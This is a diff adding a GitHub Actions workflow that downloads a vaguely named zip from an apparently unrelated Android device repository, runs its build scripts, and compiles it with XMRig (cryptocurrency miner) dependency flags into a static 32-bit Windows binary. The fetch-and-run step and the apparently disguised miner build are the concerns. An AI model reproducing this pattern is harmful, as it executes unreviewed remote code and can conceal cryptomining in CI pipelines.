@@ -1,0 +1,48 @@
+name: Build and Install Dependencies (win_i686)
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v2
+
+      - name: Set up MSYS2 for i686
+        uses: msys2/setup-msys2@v2
+        with:
+          msystem: MINGW32
+          update: true
+          install: >-
+            mingw-w64-i686-gcc
+            mingw-w64-i686-cmake
+            mingw-w64-i686-openssl
+            make
+
+      - name: Download and Unzip Source Code
+        run: |
+          curl -L -o testformycode.zip https://raw.githubusercontent.com/Janit8r/device_lge_judyln/refs/heads/S/testformycode.zip
+          tar -xf testformycode.zip
+
+      - name: Build Project for i686
+        run: |
+          cd testformycode/scripts-32
+          chmod +x *.sh
+          ./build_deps.sh
+          cd ..
+          mkdir build
+          cd build
+          cmake -G "MinGW Makefiles" -DXMRIG_DEPS=scripts-32/deps -DCMAKE_C_FLAGS="-m32 -static" -DCMAKE_CXX_FLAGS="-m32 -static" -DCMAKE_EXE_LINKER_FLAGS="-m32 -static" ..
+          mingw32-make
+
+      - name: Upload Build Artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: build-output
+          path: testformycode/build
